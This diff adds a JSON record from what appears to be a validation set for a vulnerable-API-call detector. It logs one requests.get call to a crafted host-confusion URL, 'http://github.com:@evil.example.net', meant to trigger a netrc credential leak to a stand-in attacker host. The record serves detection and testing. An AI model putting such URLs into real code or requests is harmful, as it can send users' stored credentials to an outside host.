@@ -1,0 +1,37 @@
+{
+  "schema_version": "api_call_evidence_v0.1",
+  "sample_id": "avcs_requests_netrc_host_confusion_true",
+  "code_file": "data/avcs_validation/avcs_requests_netrc_host_confusion_true.py",
+  "parse_status": "ok",
+  "parse_error": "",
+  "api_call_count": 1,
+  "api_calls": [
+    {
+      "import_name": "requests",
+      "distribution": "requests",
+      "api_symbol": "requests.get",
+      "binding_type": "module_import",
+      "location": {
+        "file": "data/avcs_validation/avcs_requests_netrc_host_confusion_true.py",
+        "line": 4,
+        "column": 12
+      },
+      "call_text": "requests.get(\n    \"http://github.com:@evil.example.net\"\n)",
+      "call_shape": {
+        "explicit_positional_arg_count": 1,
+        "positional_arg_values": [
+          {
+            "position": 0,
+            "source_text": "\"http://github.com:@evil.example.net\"",
+            "resolved_symbol": null,
+            "literal_value": "http://github.com:@evil.example.net"
+          }
+        ],
+        "keyword_arg_names": [],
+        "keyword_arg_values": {},
+        "has_star_args": false,
+        "has_star_kwargs": false
+      }
+    }
+  ]
+}
